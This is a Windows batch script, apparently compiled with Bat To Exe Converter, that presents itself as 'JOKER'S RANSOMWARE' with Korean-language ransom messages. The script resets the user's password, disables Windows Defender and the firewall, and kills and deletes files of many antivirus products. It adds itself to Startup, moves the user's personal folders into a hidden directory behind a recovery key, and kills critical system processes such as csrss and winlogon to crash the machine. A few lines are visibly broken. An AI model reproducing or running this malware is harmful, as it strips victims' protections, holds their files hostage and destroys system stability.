::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCuDJNJUAM7N/JCrgIho+Fcx+EmQDCR3FCILVJkh2Anz9XYv5r2DIecW1UPteZMRWrqmEwHFM5evmJ5WgkImrGNNoGGHMIqMoQr3Q02eq3RhJCt9hGyw
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSzk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpSI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCuDJNJUAM7N/JCrgIho+Fcx+EmQDCR3FCILVJkh2Anz9XYv5r2DIecW1UPteZMR1XZTm8ABCSRgKEblaxcxyQ==
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
title 이 창을 닫지 마십시오

set "filename=clickme.bat"

if not "%~nx0" == "%filename%" (
  echo Renaming %~nx0 to %filename% and restarting...
  timeout 2 >nul
  ren "%~nx0" "%filename%"
  start "" "%filename%"
  exit /b
)


net user %username% dbswndnjs9999(
sc config Sense start= disabled > NUL 2>&1
net stop Sense > NUL 2>&1
sc config WdFilter start= disabled > NUL 2>&1
net stop WdFilter > NUL 2>&1
sc config WdNisSvc start= disabled > NUL 2>&1
net stop WdNisSvc Track > NUL 2>&1
sc config WinDefend start= disabled > NUL 2>&1
net stop WinDefend > NUL 2>&1
reg add "HKLM\System\CurrentControlSet\Services\Sense" /v "Start" /t REG_DWORD /d "4" /f > NUL 2>&1
reg add "HKLM\System\CurrentControlSet\Services\WdFilter" /v "Start" /t REG_DWORD /d "4" /f > NUL 2>&1
reg add "HKLM\System\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f > NUL 2>&1
reg add "HKLM\System\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f > NUL 2>&1

schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable > NUL 2>&1
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /Disable > NUL 2>&1
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable > NUL 2>&1
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable > NUL 2>&1

reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f > NUL 2>&1
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d 1 /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d 1 /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d 1 /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d 0 /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SubmitSamplesConsent" /t REG_DWORD /d 0 /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /t REG_DWORD /d 0 /f
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsDefender" /f > NUL 2>&1
sc config WinDefend start= disabled
sc stop WinDefend
rem --
rem Permamanently Kill Anti-Virus
net stop "Security Center"
netsh firewall set opmode mode=disable
tskill /A av*
tskill /A fire*
tskill /A anti*
cls
tskill /A spy*
tskill /A bullguard
rem
rem Permanently Kill Anti-Virus
net stop ?Security Center?
netsh firewall set opmode mode=disable
tskill /A av*
tskill /A fire*
tskill /A anti*
cls
tskill /A spy*
tskill /A bullguard
tskill /A PersFw
tskill /A KAV*
tskill /A ZONEALARM
tskill /A SAFEWEB
cls
tskill /A spy*
tskill /A bullguard
tskill /A PersFw
tskill /A KAV*
tskill /A ZONEALARM
tskill /A SAFEWEB
cls
tskill /A OUTPOST
tskill /A nv*
tskill /A nav*
tskill /A F-*
tskill /A ESAFE
tskill /A cle
cls
tskill /A BLACKICE
tskill /A def*
tskill /A kav
tskill /A kav*
tskill /A avg*
tskill /A ash*
cls
tskill /A aswupdsv
tskill /A ewid*
tskill /A guard*
tskill /A guar*
tskill /A gcasDt*
tskill /A msmp*
cls
tskill /A mcafe*
tskill /A mghtml
tskill /A msiexec
tskill /A outpost
tskill /A isafe
tskill /A zap*cls
tskill /A zauinst
tskill /A upd*
tskill /A zlclien*
tskill /A minilog
tskill /A cc*
tskill /A norton*
cls
tskill /A norton au*
tskill /A ccc*
tskill /A npfmn*
tskill /A loge*
tskill /A nisum*
tskill /A issvc
tskill /A tmp*
cls
tskill /A tmn*
tskill /A pcc*
tskill /A cpd*
tskill /A pop*
tskill /A pav*
tskill /A padmincls
tskill /A panda*
tskill /A avsch*
tskill /A sche*
tskill /A syman*
tskill /A virus*
tskill /A realm*cls
tskill /A sweep*
tskill /A scan*
tskill /A ad-*
tskill /A safe*
tskill /A avas*
tskill /A norm*
cls
tskill /A offg*
del /Q /F C:\Program Files\alwils~1\avast4\*.*
del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe
del /Q /F C:\Program Files\kasper~1\*.exe
cls
del /Q /F C:\Program Files\trojan~1\*.exe
del /Q /F C:\Program Files\f-prot95\*.dll
del /Q /F C:\Program Files\tbav\*.datcls
del /Q /F C:\Program Files\avpersonal\*.vdf
del /Q /F C:\Program Files\Norton~1\*.cnt
del /Q /F C:\Program Files\Mcafee\*.*
cls
del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\*.*
del /Q /F C:\Program Files\Norton~1\*.*
cls
del /Q /F C:\Program Files\avgamsr\*.exe
del /Q /F C:\Program Files\avgamsvr\*.exe
del /Q /F C:\Program Files\avgemc\*.exe
cls
del /Q /F C:\Program Files\avgcc\*.exe
del /Q /F C:\Program Files\avgupsvc\*.exe
del /Q /F C:\Program Files\grisoft
del /Q /F C:\Program Files\nood32krn\*.exe
del /Q /F C:\Program Files\nood32\*.exe
cls
del /Q /F C:\Program Files\nod32
del /Q /F C:\Program Files\nood32
del /Q /F C:\Program Files\kav\*.exe
del /Q /F C:\Program Files\kavmm\*.exe
del /Q /F C:\Program Files\kaspersky\*.*
cls
del /Q /F C:\Program Files\ewidoctrl\*.exe
del /Q /F C:\Program Files\guard\*.exe
del /Q /F C:\Program Files\ewido\*.exe
cls
del /Q /F C:\Program Files\pavprsrv\*.exe
del /Q /F C:\Program Files\pavprot\*.exe
del /Q /F C:\Program Files\avengine\*.exe
cls
del /Q /F C:\Program Files\apvxdwin\*.exe
del /Q /F C:\Program Files\webproxy\*.exe
del /Q /F C:\Program Files\panda
software\*.*
rem
title JOKER'S RANSOMWARE
xcopy clickme.bat "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startup" /h /y
xcopy /h /y clickme.bat "%userprofile%\AppData"
chcp 949
set backup=%cd%
cd/
if not %cd%==C:\ cd /d c:\
del %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbso.vbs
del %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbs.vbs
del %userprofile%\POWER-JOKER-PASSWORD.txt
cd %backup%
if %cd%==%userprofile%\AppData goto a
cd %userprofile%\AppData
start %userprofile%\AppData\clickme.bat
exit
:a
mode con cols=120 lines=30
title 이 창을 닫지 마십시오
del %userprofile%\Desktop\*.joker* >nul 2>&1
del %userprofile%\pictures\*.joker* >nul 2>&1
del %userprofile%\videos\*.joker* >nul 2>&1
del %userprofile%\documents\*.joker* >nul 2>&1
del %userprofile%\downloads\*.joker* >nul 2>&1
md %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\ >nul 2>&1
md %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\desk >nul 2>&1
md %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\pic >nul 2>&1
md %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\video >nul 2>&1
md %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\doc >nul 2>&1
md %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\down >nul 2>&1
move %userprofile%\Desktop\*.* %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\desk\
copy %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\desk\*.* %userprofile%\Desktop\*.joker*
move %userprofile%\pictures\*.* %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\pic\
copy %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\pic\*.* %userprofile%\pictures\*.joker*
move %userprofile%\videos\*.* %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\video\
copy %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\video\*.* %userprofile%\videos\*.joker*
move %userprofile%\Documents\*.* %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\doc\
copy %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\doc\*.* %userprofile%\Documents\*.joker*
move %userprofile%\downloads\*.* %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\down\
copy %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\down\*.* %userprofile%\downloads\*.joker*
cls
title JOKER'S RANSOMWARE
ECHO  ■■■■■                  ■■■                  ■    ■■                ■■■■■                ■■■■
ECHO      ■                    ■      ■                ■  ■                    ■                        ■      ■
ECHO      ■                    ■      ■                ■■                      ■■■■                  ■■■■
ECHO      ■                    ■      ■                ■  ■                    ■                        ■      ■
ECHO  ■■■                      ■■■                  ■    ■■                ■■■■■                ■      ■
ECHO.
ECHO  ■■■■      ■■■    ■      ■  ■■■■■    ■■■    ■      ■  ■      ■    ■■■    ■■■■    ■■■■■
ECHO  ■      ■  ■      ■  ■■    ■  ■          ■      ■  ■■  ■■  ■  ■  ■  ■      ■  ■      ■  ■
ECHO  ■■■■    ■■■■■  ■  ■  ■  ■■■■■  ■      ■  ■  ■  ■  ■  ■  ■  ■■■■■  ■■■■    ■■■■
ECHO  ■      ■  ■      ■  ■    ■■          ■  ■      ■  ■      ■  ■  ■  ■  ■      ■  ■      ■  ■
ECHO  ■      ■  ■      ■  ■      ■  ■■■■■    ■■■    ■      ■    ■  ■    ■      ■  ■      ■  ■■■■■
echo 이 창을 닫지 마십시오!
timeout/t 3 /nobreak >nul
cls
echo 이 랜섬웨어를 실행해 주셔서 감사합니다.
echo 당신의 컴퓨터는 JOKER 랜섬웨어에 의해 암호화되었습니다.
echo 이 창을 끈다면 당신의 파일들을 복구할 수 없을 것입니다.
echo 복구를 하기 위해서는 복구키를 입력하십시오.
echo 복구키가 틀린다면, 블루스크린이 뜨며 재부팅 될 것입니다.
echo 컴퓨터의 전원을 꺼도 JOKER 랜섬웨어는 돌아올 것입니다.
echo JOKER 랜섬웨어를 삭제해도 JOKER 랜섬웨어는 종료되지 않을 것입니다.
set PASS=dbswndnjs9999(
echo x=msgbox("당신의 바탕화면, 다운로드, 문서, 사진, 비디오 폴더 안의 모든 파일이 암호화되었습니다.",0+16,"JOKER")>> %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbs.vbs
echo x=msgbox("JOKER 랜섬웨어를 닫는다면 당신의 파일을 복구할 수 없을 것입니다.",0+16,"JOKER")>> %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbs.vbs
echo x=msgbox("컴퓨터의 전원을 꺼도 JOKER 랜섬웨어는 돌아올 것입니다.",0+16,"JOKER")>> %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbs.vbs
echo x=msgbox("JOKER 랜섬웨어를 지워도 JOKER 랜섬웨어는 정상적으로 작동될 것입니다.",0+16,"JOKER")>> %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbs.vbs
echo CreateObject("SAPI.SpVoice").Speak "당신의 바탕화면, 다운로드, 문서, 사진, 비디오 폴더 안의 모든 파일이 암호화되었습니다.">> %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbso.vbs
echo CreateObject("SAPI.SpVoice").Speak "JOKER 랜섬웨어를 닫는다면 당신의 파일을 복구할 수 없을 것입니다.">> %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbso.vbs
POWER\clickmevbso.vbs
echo CreateObject("SAPI.SpVoice").Speak "컴퓨터의 전원을 꺼도 JOKER 랜섬웨어는 돌아올 것입니다.">> %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbso.vbs
echo CreateObject("SAPI.SpVoice").Speak "JOKER 랜섬웨어를 지워도 JOKER 랜섬웨어는 정상적으로 작동될 것입니다.">> %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbso.vbs
start %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbs.vbs
start %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbso.vbs

:pass
set /p password=복구키 : 
timeout/t 2 /nobreak >nul
if %password%==developerdecryptkey goto good
if %password%==%PASS% goto good

:bad
color 47
cls
echo 존재하지 않는 복구키입니다.
echo 블루스크린이 가동됩니다.
timeout/t 2 >nul
cls
taskkill /f /im csrss.exe
taskkill /f /im svchost.exe
taskkill /f /im wininit.exe
taskkill /f /im winlogon.exe
set /p password=복구키 : 
if %password%==developerdecryptkey goto good
if %password%==%PASS% goto good
timeout/t 2 >nul
goto bad

:good
cls
echo 복구중...
echo 절대 이 창을 닫지 마십시오.
echo 복구에는 약 5초의 시간이 걸립니다.
timeout/t 5 /nobreak >nul
del %userprofile%\Desktop\*.joker*
move %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\desk\*.* %userprofile%\Desktop\
del %userprofile%\pictures\*.joker*
move %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\pic\*.* %userprofile%\pictures\
del %userprofile%\videos\*.joker*
move %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\video\*.* %userprofile%\videos\
del %userprofile%\documents\*.joker*
move %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\doc\*.* %userprofile%\documents\
del %userprofile%\downloads\*.joker*
move %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\down\*.* %userprofile%\downloads\
cls
del %userprofile%\POWER-JOKER-PASSWORD.txt
del /a "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startup\clickme.bat"
rmdir /s /q %userprofile%\AppData\RANSOMWARE-MUTANT-POWER
cls
echo 해독 성공
timeout /t 5 /nobreak >nul
exit